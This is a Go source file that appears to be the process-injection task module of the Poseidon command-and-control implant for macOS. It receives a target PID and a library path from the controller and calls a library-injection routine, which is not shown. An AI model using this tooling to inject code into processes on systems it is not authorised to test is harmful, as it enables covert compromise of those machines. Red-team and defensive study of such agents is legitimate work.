package inject

import (
	"encoding/json"
	"fmt"
	"log"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

// Inject C source taken from: http://www.newosxbook.com/src.jl?tree=listings&file=inject.c
type Injection interface {
	TargetPid() int
	Shellcode() []byte
	Success() bool
	SharedLib() string
}

type Arguments struct {
	PID         int    `json:"pid"`
	LibraryPath string `json:"library"`
}

func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	tMsg.TaskItem = task

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	if err != nil {
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	result, err := injectLibrary(args.PID, args.LibraryPath)

	if err != nil {
		log.Println("Failed to inject shellcode:", err.Error())
		tMsg.Error = true
		tMsg.TaskResult = []byte(err.Error())
		threadChannel <- tMsg
		return
	}

	tMsg.TaskResult = []byte(fmt.Sprintf("Code injection into pid: %d returned result: %s", args.PID, result.Success()))
	threadChannel <- tMsg
}
